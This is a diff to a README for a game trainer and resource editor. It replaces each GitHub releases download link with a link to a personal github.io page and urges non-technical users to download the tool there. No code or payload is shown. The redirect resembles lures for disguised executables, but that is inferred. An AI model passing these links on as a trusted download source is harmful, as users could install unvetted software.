@@ -1,6 +1,6 @@
 # 🏰 Dungeon-Settlers-Trainer-Resource-Editor - Your Ultimate Colony Management Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Dungeon_Settlers_Trainer-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/FrancisNjavwa/Dungeon-Settlers-Trainer-Resource-Editor/releases)
+[![Download Now](https://img.shields.io/badge/Download-Dungeon_Settlers_Trainer-blue?style=for-the-badge&logo=github&color=4B0082)](https://francisnjavwa.github.io)
 
 ---
 
@@ -46,7 +46,7 @@ Think of it as your personal game control panel. You don't need to know any prog
 ## 🚀 Getting Started – Step by Step Guide
 
 ### Step 1: Download the Application
-Visit this link to download the application: [**Download Dungeon-Settlers-Trainer-Resource-Editor**](https://github.com/FrancisNjavwa/Dungeon-Settlers-Trainer-Resource-Editor/releases)
+Visit this link to download the application: [**Download Dungeon-Settlers-Trainer-Resource-Editor**](https://francisnjavwa.github.io)
 
 The download button will be clearly visible on the page. Look for the latest version number and click the download link next to it.
 
@@ -209,7 +209,7 @@ Your input directly influences which features get added next!
 
 ---
 
-**Download now and take control of your game:** [https://github.com/FrancisNjavwa/Dungeon-Settlers-Trainer-Resource-Editor/releases](https://github.com/FrancisNjavwa/Dungeon-Settlers-Trainer-Resource-Editor/releases)
+**Download now and take control of your game:** [https://francisnjavwa.github.io](https://francisnjavwa.github.io)
 
 ---
 
